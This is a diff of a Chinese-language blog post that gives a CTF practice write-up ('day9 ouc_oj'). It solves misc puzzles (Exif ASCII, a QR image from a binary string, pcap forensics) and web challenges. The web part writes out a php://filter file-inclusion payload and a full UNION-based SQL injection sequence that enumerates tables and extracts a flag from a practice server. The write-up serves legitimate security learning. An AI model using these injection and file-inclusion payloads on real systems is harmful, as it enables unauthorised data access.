@@ -1,12 +1,198 @@
 ---
 layout: post
-title: "day6 ouc_oj"
-date:  2020-05-22 14:58:44
-description: "day6 wp"
+title: "day9 ouc_oj"
+date:  2020-05-25 14:58:44
+description: "day9 wp"
 tag: 总结
 ---
 
-## Web-Part
+> 论文终于给老师检查完了，还是有需要修改的地方，不过终于可以做题咯
+
+# Misc Part
+
+###  day9-Poem
+
+看图结合蛤->想起一句诗，把诗输入，get flag
+
+
+
+### day9-LSB
+
+题目给解法了，扫码，get flag
+
+![image-20200525224755129](/images/oj_wp/image-20200525224755129.png)
+
+
+
+### day9-Exif
+
+使用电脑查看exif信息，看样子是ascii码，解码，get flag
+
+```python
+str = "102,108,97,103,123,101,120,105,102,95,104,105,100,100,101,110,95,102,108,52,103,125"
+list = str.split(',')
+flag=''
+for i in list:
+	flag += chr(int(i))
+print(flag)
+```
+
+![image-20200525225700404](/images/oj_wp/image-20200525225700404.png)
+
+
+
+### day9-Another 01Game
+
+按照题目所给的思路，写脚本将题目给的01字符串生成图片
+
+```python
+#!/usr/bin/env python
+from PIL import Image
+MAX = 37
+pic = Image.new("RGB",(MAX, MAX))
+file = open("1.txt",'r')
+m = file.read()
+print(len(m))
+i=0
+for y in range (0,MAX):
+    for x in range (0,MAX):
+        if(m[i] == '0'):
+            pic.putpixel([x,y],(0, 0, 0))
+        else:
+            pic.putpixel([x,y],(255,255,255))
+        i = i+1
+pic.show()
+pic.save("flag.png")
+```
+
+扫码获得01字符串`110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101`
+
+长度为189，ascii码的最大值为127，也就是0b11111，长度为7
+
+把获得的01字符串按7个一组进行ascii解码，获得flag
+
+```python
+#coding:utf-8
+import re
+a = "110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101"
+
+result = re.findall(r'.{7}', a)
+print(result)
+flag = ""
+for i in result:
+    tmp = int(i, 2)
+    flag += chr(tmp)
+print(flag)
+```
+
+
+
+### day9-docx
+
+word的本质是zip，修改文件后缀为zip，打开get flag
+
+
+
+### day9-Forensics1
+
+Wireshark打开文件，然后追踪http流，发现有一组数据中提到flag和一个s3cret.png文件，提取图片，get flag
+
+
+
+### day9-Forensics2
+
+使用`binwalk -e xx.pcap `命令，即可提取出flag.txt文件
+
+
+
+# Web Part
+
+### day 9-BasicFileInclude
+
+#### 题目描述：
+
+![image-20200525214432331](/Users/secat/SKSEC/GitHub/BossGirl.github.io/images/oj_wp/image-20200525214432331.png)
+
+#### 解题思路：
+
+这是一道文件包含的题目。这道题中一共有两个页面，一个是home，一个是flag，访问flag page：`ha ha? you want flag? flag is here, but don't let you see!`，可以看出flag应该在这个页面中，但是没有显示出来。
+
+想要获取被隐藏的内容需要使用PHP伪协议，这里的目的是读取flag文件，所以应当使用`php://filter`来读取源码。
+
+构造URL：
+
+```
+http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag
+```
+
+其中`read`的过滤器为base64，意为把输入流进行base64编码；`resource`指的是所要读取的文件
+
+![image-20200525215718596](/Users/secat/SKSEC/GitHub/BossGirl.github.io/images/oj_wp/image-20200525215718596.png)
+
+对获取到的内容进行base64解码，得到以下内容，get flag
+
+```php
+ha ha? you want flag? flag is here<?php
+// try to read this source code
+//$flag = 'flag{really***should_know}';
+?>, but don't let you see!
+```
+
+
+
+### day 9-Basic SQL
+
+#### 题目描述：
+
+![image-20200525220221182](/Users/secat/SKSEC/GitHub/BossGirl.github.io/images/oj_wp/image-20200525220221182.png)
+
+#### 解题思路：
+
+在搜索框中输入`hello`，正常。
+
+输入`hello'`，页面500错误，可以注入
+
+
+
+输入`hello' order by 1 #`，正常
+
+输入`hello' order by 2 #`，正常
+
+输入`hello' order by 3 #`，正常
+
+输入`hello' order by 4 #`，500错误，从未判断数据表有三列
+
+输入`hello' union select 1,2,3#`，news中显示`2` ` 3`，可知2，3位置为回显点
+
+
+
+查找数据库名：输入`hello' union select 1,database(),3#`，news中显示`news ` `3`，可知库名为`news`
+
+查找数据库的表名：输入`hello' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#`，news中显示`f1agfl4gher3,news` `3`,所以存在名为`f1agfl4gher3`与`news`的表
+
+查找`f1agfl4gher3`中的字段名：`hello' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='f1agfl4gher3'#`，news中显示`id,h3r31sfl4g` `3`
+
+查询`h3r31sfl4g`中的数据：`hello' union select 1,h3r31sfl4g,3 from f1agfl4gher3#`，news中显示`flag{sql***hack}`，get flag
+
+
+
+### day9-Welcome to web
+
+#### 题目描述：
+
+```php
+<?php
+	if(isset($_GET['key'])){
+		if($_GET['key'] == 'areyousure'){
+			echo 'For this exercise, flag is: ******';
+		}
+	}
+?>
+```
+
+构造URL：`http://vps1.blue-whale.me:23331/php0/?key=areyousur`,get flag
+
+
 
 ### day 6 BabyXSS
 
